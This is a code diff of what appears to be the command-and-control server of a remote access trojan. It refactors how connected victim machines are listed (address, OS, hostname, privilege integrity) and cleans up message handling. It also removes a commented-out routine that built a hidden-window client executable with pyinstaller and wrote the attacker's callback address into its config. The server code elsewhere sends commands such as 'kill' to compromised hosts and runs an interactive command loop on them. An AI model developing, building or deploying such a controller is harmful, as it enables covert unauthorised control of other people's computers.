@@ -6,10 +6,10 @@ import threading
 import time
 
 from common.ratsocket import RATSocket
-from common.util import logger, parse
-from server.config.config import SOCKET_ADDR
+from common.util import logger, parse, print_table
 from server.commands.AliasManager import AliasManager
 from server.commands.CommandExecutor import CommandExecutor
+from server.config.config import SOCKET_ADDR
 from server.util.util import *
 from server.wrapper.client import Client
 
@@ -69,7 +69,7 @@ class Server:
                 conn.recv_result()
             except socket.error:
                 logger.error(f'Connection closed: {conn.address}')
-                conn.results.put(status=0, message='Receiving aborted')
+                conn._results_queue.put(status=0, message='Receiving aborted')
                 self.connections.remove(conn)
                 break
             except:
@@ -81,42 +81,26 @@ class Server:
         显示连接列表
         """
         if not self.connections:
-            print("当前没有活跃连接")
+            print("No active connections at present")
             return
 
-        # 准备连接数据
-        connections = []
-        for i, conn in enumerate(self.connections):
-            connections.append([
+        # 准备表头和数据
+        headers = ['ID', 'Address', 'OS', 'OS Version', 'Hostname', 'Integrity']
+        data = [
+            [
                 str(i),  # ID
                 conn.info.get('addr', 'N/A'),
                 conn.info.get('os_type', 'Unknown'),
                 conn.info.get('os_ver', 'Unknown'),
                 conn.info.get('hostname', 'Unknown'),
                 conn.info.get('integrity', '?')
-            ])
+            ]
+            for i, conn in enumerate(self.connections)
+        ]
 
-        # 计算每列最大宽度
-        headers = ['ID', 'Address', 'OS', 'OS Version', 'Hostname', 'Integrity']
-        col_widths = [len(h) for h in headers]
-
-        for conn in connections:
-            for i, item in enumerate(conn):
-                col_widths[i] = max(col_widths[i], len(str(item)))
-
-        # 构建格式字符串
-        row_format = " | ".join([f"{{:<{w}}}" for w in col_widths])
-
-        # 打印表头
-        print("\n" + row_format.format(*headers))
-        print("-" * (sum(col_widths) + 4 * len(headers)))  # 分隔线
-
-        # 打印每行数据
-        for conn in connections:
-            print(row_format.format(*conn))
-
-        print()
-
+        # 使用通用方法打印表格
+        print_table(headers, data)
+        
     def get_last_connection(self) -> Client:
         """
         获取最新连接
@@ -147,16 +131,15 @@ class Server:
         if conn:
             conn.send_command('kill')
 
-
     def open_connection(self, conn: Client):
         """
         与连接交互
         :param conn: 连接
         """
         print('[+] Connected to {}'.format(conn.address))
-        conn.status = True  # 设置连接为交互中
-        while not conn.results.empty():  # 连接前判断有没有未读消息
-            logger.info(conn.results.get()[1])
+        conn._is_interactive = True  # 设置连接为交互中
+        while not conn._results_queue.empty():  # 连接前判断有没有未读消息
+            logger.info('[UNREAD] ' + conn._results_queue.get()[1])
         command_executor = CommandExecutor(conn, self)
         try:
             while 1:
@@ -191,7 +174,7 @@ class Server:
             time.sleep(0.1)
         except Exception as e:
             print_error(f'{e.__class__.__name__}: {e}')
-        conn.status = False
+        conn._is_interactive = False
 
     def cmdloop(self):
         """
@@ -225,8 +208,6 @@ class Server:
                 # 切换目录
                 elif name == 'cd':
                     print(cd(arg))
-                # elif name == 'gen':
-                #     gen(arg)
                 # 与指定客户端交互
                 else:
                     try:
@@ -241,67 +222,6 @@ class Server:
                 write(0, f'[-] {type(e).__name__}: {e}')
             finally:
                 print()
-
-    # def load_aliases(self):
-    #     """
-    #     从文件中加载命令别名
-    #     """
-    #     try:
-    #         with open(ALIAS_PATH, 'r') as f:
-    #             self.aliases = json.load(f)
-    #     except:
-    #         pass
-    #
-    # def save_aliases(self):
-    #     """
-    #     保存命令别名到文件
-    #     :return:
-    #     """
-    #     with open(ALIAS_PATH, 'w') as f:
-    #         json.dump(self.aliases, f)
-
-    # def send_alias(self, conn, name, arg):
-    #     """
-    #     发送命令别名
-    #     :param name: 别名
-    #     :param arg: 别名参数
-    #     :param conn: 连接
-    #     :return: 命令id，命令
-    #     """
-    #     command = self.aliases.get(name)
-    #     # 替换参数
-    #     regex = '<.*?>'
-    #     provided_args = shlex.split(arg)  # 实际传入的参数
-    #     required_args = re.findall(regex, command)  # 要求的参数
-    #     if len(required_args) > 0:  # 如果命令要求参数
-    #         if len(required_args) != len(provided_args):  # 如果参数个数不一致
-    #             raise SyntaxError('number of arguments does not match')
-    #         for arg in provided_args:
-    #             command = re.sub(regex, arg, command, count=1)
-    #     else:  # 命令原型中没有参数
-    #         if len(provided_args) != 0:  # 传入了参数
-    #             raise SyntaxError('no argument expected')
-    #     # 发送命令
-    #     func = partial(conn.send_command, command)
-    #     for i in func():
-    #         yield i
-#
-#
-# def gen(address_port_str):
-#     exit_code = subprocess.Popen("pyinstaller -Fw ratclient.py -i NONE", shell=True).wait()
-#     if exit_code == 0:
-#         print(f'Executable generated successfully: {os.path.abspath("dist/ratclient.exe")}')
-#     else:
-#         raise Exception(f"Error occurred while running pyinstaller. Exit code: {exit_code}")
-#
-#     if address_port_str.strip():
-#         parts = address_port_str.split(':')
-#         if len(parts) == 2:
-#             ip_address = parts[0]
-#             port = int(parts[1])
-#             with open('dist/ratclient.ini', 'wt') as file:
-#                 file.write(f'[default]\nip = {ip_address}\nport = {port}')
-#             print(f'Configuration file generated successfully: {os.path.abspath("dist/ratclient.ini")}')
 
 
 if __name__ == '__main__':
